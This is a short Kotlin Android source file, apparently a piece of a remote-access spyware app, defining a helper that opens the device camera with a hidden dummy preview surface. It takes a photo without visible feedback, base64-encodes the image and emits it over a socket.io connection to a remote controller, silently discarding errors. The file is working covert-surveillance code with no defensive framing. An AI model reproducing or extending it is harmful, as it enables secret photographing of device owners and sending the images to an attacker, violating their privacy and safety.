package com.example.betryalcommit

import android.graphics.SurfaceTexture
import android.hardware.Camera
import android.util.Base64
import io.socket.client.Socket
import org.json.JSONObject

class CameraCaptureHelper {

    fun capture(socket: Socket, cameraId: Int) {
        val camera = Camera.open(cameraId)

        try {
            camera.setPreviewTexture(SurfaceTexture(0))
            camera.startPreview()
            camera.takePicture(
                null,
                null
            ) { data, _ ->
                try {
                    val base64Data = Base64.encodeToString(data, Base64.DEFAULT)
                    val message = JSONObject()
                    message.put("type", "image_data")
                    message.put("data", base64Data)
                    socket.emit("response", message.toString())
                } catch (e: Exception) {
                } finally {
                    camera.release()
                }
            }
        } catch (e: Exception) {

            camera.release()
        }
    }


}